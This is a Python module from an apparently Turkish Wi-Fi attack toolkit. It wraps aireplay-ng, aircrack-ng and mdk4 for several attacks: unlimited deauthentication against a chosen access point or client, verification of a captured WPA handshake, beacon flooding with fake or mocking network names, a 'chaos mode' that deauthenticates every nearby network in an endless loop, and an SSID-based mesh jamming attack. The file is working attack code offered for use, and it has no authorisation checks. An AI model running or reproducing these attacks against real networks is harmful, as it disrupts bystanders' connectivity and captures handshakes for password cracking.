import subprocess
import os
import random
import string
import time
from modules import radar, engine, i18n
t = i18n.t

# --- DEAUTH ATTACK (Ağdan Düşürme Saldırısı) ---
def pulse_kick(iface, bssid, client=None, timer=0, channel=None):
    if os.path.exists("/usr/bin/nmcli"):
        subprocess.run(["sudo", "nmcli", "device", "set", iface, "autoconnect", "no"], capture_output=True)
        subprocess.run(["sudo", "nmcli", "device", "disconnect", iface], capture_output=True)
        subprocess.run(["sudo", "nmcli", "device", "set", iface, "managed", "no"], capture_output=True)
        time.sleep(1) 
        
    if channel:
        subprocess.run(["sudo", "ip", "link", "set", iface, "up"], capture_output=True)
        subprocess.run(["sudo", "iwconfig", iface, "channel", str(channel)], capture_output=True)
        subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(channel)], capture_output=True)
        time.sleep(1)
        
    val_timer = t("strike_pulse_kick_unlimited") if timer == 0 else f"{timer} sn"
    print(t("strike_pulse_kick_start", bssid=bssid, timer=val_timer))
    
    cmd = ["sudo", "aireplay-ng", "--ignore-negative-one", "-0", "0", "-a", bssid]
    if client: cmd.extend(["-c", client])
    cmd.append(iface)
    
    try:
        if timer > 0:
            subprocess.run(cmd, timeout=timer)
            print(t("strike_timeout"))
        else:
            subprocess.run(cmd)
    except subprocess.TimeoutExpired:
        print(t("strike_timeout"))
    except KeyboardInterrupt:
        print(t("strike_cancel"))

def verify_handshake(cap_file):
    print(t("strike_handshake_check", cap_file=cap_file))
    cmd = ["sudo", "aircrack-ng", cap_file]
    res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    if "1 handshake" in res.stdout or "WPA (1 handshake" in res.stdout:
        print(t("strike_handshake_success"))
        return True
    else:
        print(t("strike_handshake_fail"))
        return False

# --- BEACON SPAM (Sahte Ağ Yayma) ---
def beacon_spam(iface):
    print(t("strike_beacon_title"))
    print(t("strike_beacon_opt1"))
    print(t("strike_beacon_opt2"))
    print(t("strike_beacon_opt3"))
    secim = input(t("strike_beacon_prompt"))
    spam_file = "/tmp/pulse_spam.txt"
    if secim == "3":
        dosya_yolu = input(t("strike_beacon_file_prompt"))
        if not os.path.exists(dosya_yolu):
            print(t("strike_beacon_file_not_found"))
            return
        spam_file = dosya_yolu
        print(t("strike_beacon_file_using", path=dosya_yolu))
    else:
        if secim == "2":
            print(t("strike_beacon_random_gen"))
            ssids = []
            for _ in range(100):
                uzunluk = random.randint(6, 12)
                isim = ''.join(random.choices(string.ascii_uppercase + string.digits, k=uzunluk))
                clean_name = radar.clean_ssid(f"WIFI_{isim}")
                ssids.append(clean_name)
        else:
            print(t("strike_beacon_standard_load"))
            ssids = [t("troll_1"), t("troll_2"), t("troll_3"), t("troll_4"), t("troll_5")]
        with open(spam_file, "w") as f:
            for isim in ssids:
                f.write(radar.clean_ssid(isim) + "\n")
                
    # YENİ EKLENEN: 5GHz / 2.4GHz MDK4 Kanal Zorlaması
    print("\n    [1] Varsayılan (Hopping - Hızlı)")
    print("    [2] Belirli Bir Kanalda Yay (Örn: 40 veya 11)")
    kanal_secim = input("    Kanal: ")
    
    print(t("strike_beacon_start"))
    try:
        cmd = ["sudo", "mdk4", iface, "b", "-f", spam_file, "-s", "1000"]
        if kanal_secim == "2":
            k_no = input("    Kanal Numarası: ")
            cmd.extend(["-c", str(k_no)])
            
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(t("strike_beacon_stop"))
    except Exception:
        print(t("strike_beacon_error"))

# --- CHAOS MODE (Kaos Modu) ---
def chaos_mode(iface):
    print(t("strike_chaos_title"))
    print(t("strike_chaos_scanning"))
    time.sleep(2)
    try:
        # Arkaplan taraması interactive=False ile çalışır, her yeri tarar
        networks = radar.auto_scan_and_select(iface, scan_time=10, interactive=False)
        if not networks:
            print(t("strike_chaos_no_nets"))
            return
        print(t("strike_chaos_targets", count=len(networks)))
        time.sleep(1)
        tur_sayisi = 1
        while True:
            print(t("strike_chaos_round_start", round=tur_sayisi))
            for net in networks:
                print(t("strike_chaos_shockwave", essid=net['essid'][:15], bssid=net['bssid'], ch=net['ch']))
                engine.run_cmd(["sudo", "iw", "dev", iface, "set", "channel", net['ch']])
                cmd = ["sudo", "aireplay-ng", "-0", "20", "-a", net['bssid'], iface]
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(t("strike_chaos_round_end", round=tur_sayisi))
            tur_sayisi += 1
    except KeyboardInterrupt:
        print(t("strike_chaos_stop"))

# --- MESH KILLER (SSID-Based Attack) ---
def mesh_strike(iface, ssid, channel=None):
    # Kanal parametresi eklendi
    ssid = radar.clean_ssid(ssid)
    print(t("strike_mesh_start", ssid=ssid))
    try:
        cmd = ["sudo", "mdk4", iface, "d", "-n", ssid]
        if channel:
            cmd.extend(["-c", str(channel)])
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(t("strike_mesh_stop", ssid=ssid))
    except Exception as e:
        print(t("strike_mesh_error", e=str(e)))